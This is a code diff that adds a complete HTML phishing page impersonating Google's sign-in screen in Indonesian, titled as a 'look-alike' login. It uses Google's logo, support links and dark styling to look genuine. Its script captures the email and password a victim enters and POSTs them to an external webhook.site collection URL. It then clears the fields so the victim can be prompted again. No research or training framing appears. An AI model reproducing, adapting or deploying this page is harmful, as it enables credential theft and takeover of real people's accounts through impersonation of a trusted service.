@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Google Mirip</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #202124;
+      color: #e8eaed;
+    }
+
+    .login-container {
+      background-color: #292a2d;
+      padding: 50px 35px;
+      width: 100%;
+      max-width: 400px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+    }
+
+    .logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 35px;
+    }
+
+    .logo img {
+      width: 90px;
+    }
+
+    h2 {
+      font-size: 28px;
+      margin-bottom: 12px;
+    }
+
+    p.subtitle {
+      font-size: 16px;
+      margin-bottom: 22px;
+      color: #bdc1c6;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 16px;
+      font-size: 16px;
+      border: 1px solid #5f6368;
+      border-radius: 6px;
+      background-color: transparent;
+      color: #e8eaed;
+    }
+
+    .input-group input:focus {
+      outline: none;
+      border-color: #8ab4f8;
+      box-shadow: 0 0 4px #8ab4f8;
+    }
+
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .checkbox-group label {
+      margin-left: 8px;
+      font-size: 14px;
+    }
+
+    a.link {
+      font-size: 15px;
+      color: #8ab4f8;
+      text-decoration: none;
+    }
+
+    a.link:hover {
+      text-decoration: underline;
+    }
+
+    .info {
+      font-size: 14px;
+      color: #bdc1c6;
+      margin-top: 24px;
+    }
+
+    .info a {
+      color: #8ab4f8;
+      text-decoration: none;
+    }
+
+    .info a:hover {
+      text-decoration: underline;
+    }
+
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 30px;
+    }
+
+    .actions button {
+      padding: 14px 24px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .actions .create-account {
+      background: none;
+      color: #8ab4f8;
+    }
+
+    .actions .create-account:hover {
+      text-decoration: underline;
+    }
+
+    .actions .next {
+      background-color: #8ab4f8;
+      color: #202124;
+      font-weight: bold;
+      cursor: not-allowed;
+      opacity: 0.6;
+    }
+
+    .actions .next.active {
+      cursor: pointer;
+      opacity: 1;
+    }
+
+    .actions .next.active:hover {
+      background-color: #6c8dc7;
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 35px;
+      font-size: 14px;
+      color: #bdc1c6;
+    }
+
+    footer a {
+      color: #8ab4f8;
+      text-decoration: none;
+      margin: 0 6px;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+
+    .dropdown {
+      margin-top: 18px;
+      font-size: 14px;
+    }
+
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 40px 20px;
+        width: 95%;
+      }
+
+      .logo img {
+        width: 100px;
+      }
+
+      h2 {
+        font-size: 30px;
+      }
+
+      p.subtitle, .info, a.link, footer, .dropdown {
+        font-size: 16px;
+      }
+
+      .input-group input {
+        padding: 18px;
+        font-size: 18px;
+      }
+
+      .actions button {
+        padding: 16px 28px;
+        font-size: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+    </div>
+    <h2>Login</h2>
+    <p class="subtitle">Gunakan Akun Google Anda</p>
+
+    <form id="loginForm">
+      <div class="input-group">
+        <input type="text" id="email" placeholder="Email atau nomor telepon" required>
+      </div>
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Masukkan sandi" required>
+      </div>
+      <div class="checkbox-group">
+        <input type="checkbox" id="showPassword">
+        <label for="showPassword">Tampilkan sandi</label>
+      </div>
+
+      <a href="https://support.google.com/accounts/answer/7682439?hl=id" class="link">Lupa email?</a>
+
+      <p class="info">
+        Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi.
+        <a href="https://support.google.com/mail/answer/8494?hl=id&co=GENIE.Platform%3DAndroid">Pelajari lebih lanjut</a>
+      </p>
+
+      <div class="actions">
+        <a href="https://support.google.com/accounts/answer/27441?hl=id&co=GENIE.Platform%3DAndroid">
+          <button type="button" class="create-account">Buat akun</button>
+        </a>
+        <button type="submit" class="next" id="nextBtn">Selanjutnya</button>
+      </div>
+    </form>
+
+    <div class="dropdown">Indonesia</div>
+    <br></br>
+    <footer class="footer">
+        
+      <a href="http://support.google.com/?hl=id">Bantuan</a>
+      <a href="https://myaccount.google.com/data-and-privacy">Privasi</a>
+      <a href="https://policies.google.com/terms?hl=id">Persyaratan</a>
+    </footer>
+  </div>
+
+  <script>
+    const emailInput = document.getElementById("email");
+const passwordInput = document.getElementById("password");
+const nextBtn = document.getElementById("nextBtn");
+
+// Fungsi untuk memeriksa validitas email dan password
+function validateInputs() {
+  const email = emailInput.value.trim();
+  const password = passwordInput.value.trim();
+  const emailValid = email.endsWith(".com") || email.endsWith(".id"); // Email harus diakhiri dengan .com
+
+  if (emailValid && password) {
+    nextBtn.classList.add("active");
+    nextBtn.disabled = false;
+  } else {
+    nextBtn.classList.remove("active");
+    nextBtn.disabled = true;
+  }
+}
+
+// Event listener untuk input email dan password
+emailInput.addEventListener("input", validateInputs);
+passwordInput.addEventListener("input", validateInputs);
+
+// Tampilkan sandi saat checkbox diaktifkan
+document.getElementById("showPassword").addEventListener("change", function() {
+  passwordInput.type = this.checked ? "text" : "password";
+});
+
+// Event listener saat form disubmit
+document.getElementById("loginForm").addEventListener("submit", function(event) {
+  event.preventDefault();
+
+  const email = emailInput.value.trim();
+  const password = passwordInput.value.trim();
+  const webhookUrl = "https://webhook.site/62d3fea7-36a5-4316-9544-fe7306f40080";
+
+  if (!email.endsWith(".com")) {
+    return;
+  }
+
+  nextBtn.disabled = true;
+
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ email, password }),
+    mode: "no-cors"
+  })
+  .then(() => {
+    emailInput.value = "";
+    passwordInput.value = "";
+    nextBtn.textContent = "Selanjutnya";
+    validateInputs(); // Periksa ulang setelah pengiriman
+  })
+  .catch(() => {
+    nextBtn.textContent = "Selanjutnya";
+    validateInputs();
+  });
+});
+
+  </script>
+</body>
+</html>
